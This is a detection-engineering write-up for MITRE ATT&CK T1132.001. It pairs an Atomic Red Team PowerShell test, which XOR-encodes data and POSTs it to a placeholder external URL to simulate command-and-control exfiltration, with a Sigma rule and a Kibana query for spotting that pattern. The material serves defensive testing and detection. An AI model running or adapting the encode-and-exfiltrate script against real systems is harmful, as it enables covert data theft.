# T1132.001 – Standard Encoding (XOR)

## Technique Description

**MITRE ATT&CK ID:** T1132.001
**Tactic:** Command and Control 
**Platform:** Windows

Adversaries use Standard Encoding techniques to obfuscate data transmitted between compromised hosts and command-and-control (C2) infrastructure. XOR encoding is a simple but effective method frequently used to evade basic content inspection and signature-based detections.

On Windows systems, attackers commonly leverage PowerShell to encode collected data in memory before transmitting it using HTTP POST requests. Because PowerShell is a legitimate administrative tool and XOR encoding does not require external libraries, this technique blends into normal system activity and avoids writing artifacts to disk.

**Real-World Usage:**  
Threat actors such as **APT33** have been observed encoding beacon data and reconnaissance output prior to exfiltration to reduce detection by perimeter security controls.

---

## Atomic Red Team Test

**Test Number:** Test #3  
**Supported Platforms:** Windows

### Test Command
```
$plaintext = ([system.Text.Encoding]::UTF8.getBytes("#{plaintext}"))
$key = "#{key}"
$cyphertext =  @();
for ($i = 0; $i -lt $plaintext.Count; $i++) {
 $cyphertext += $plaintext[$i] -bxor $key[$i % $key.Length];
}
$cyphertext = [system.Text.Encoding]::UTF8.getString($cyphertext)
[System.Net.ServicePointManager]::Expect100Continue = $false
Invoke-WebRequest -Uri #{destination_url} -Method POST -Body $cyphertext -DisableKeepAlive
```

**Parameters:**
- `-bxor` - Performs XOR encoding of the plaintext

- `System.Text.Encoding` - Converts data to/from byte arrays

- `Invoke-WebRequest` - Sends encoded data to a remote endpoint

- `POST` - Simulates C2 data exfiltration

### Expected Behavior
When executed, PowerShell encodes sensitive-looking data in memory using XOR logic and attempts to transmit the encoded output to an external server via HTTP POST. No files are written to disk, and all operations occur within a single PowerShell process.

---

## Sigma Rule

```yaml
title: PowerShell XOR Encoded Data Exfiltration
id: c3ed6d2a-t1132-001-xor-encoding
status: experimental
description: Detects PowerShell-based XOR encoding of data followed by outbound POST requests, consistent with encoded Command and Control communication
    - https://attack.mitre.org/techniques/T1132/001
    - https://github.com/redcanaryco/atomic-red-team
author: Ghofrane Amemi
date: 2026-01-30
tags:
  - attack.execution
  - attack.t1132
  - attack.t1132.001
  - atomic_red_team

logsource:
  product: windows
  category: process_creation
  service: sysmon

detection:
  selection_powershell:
    Image|endswith: '\powershell.exe'
    CommandLine|contains:
      - '-bxor'
      - 'Invoke-WebRequest'
      - '-Method POST'
      - 'System.Text.Encoding'

  condition: selection_powershell

falsepositives:
  - Custom PowerShell scripts performing data encoding
  - Internal automation posting encoded payloads
  - Security testing environments

level: high
```
---

## Kibana Detection Query

**Rule Name:** T1132.001 – XOR Encoded Command and Control
**Severity:** High

### KQL Query
```kql
inlog.channel: "Microsoft-Windows-Sysmon/Operational"
AND event.code: "1"
AND process.name: "powershell.exe"
AND (process.command_line.text: "*-bxor*"
AND process.command_line.text: "*Invoke-WebRequest*"
AND process.command_line.text: "*POST*")
```

### Required Data Sources
- **Log Source:** Sysmon
- **Event ID:** 1 (Process Creation)
- **Channel:** Microsoft-Windows-Sysmon/Operational

---

## Limitations

This detection does not cover:
- Encoded data transmitted via HTTPS-only APIs without visible command-line arguments
- XOR encoding performed in compiled malware
- PowerShell encoding performed via Base64-only techniques (T1132.002)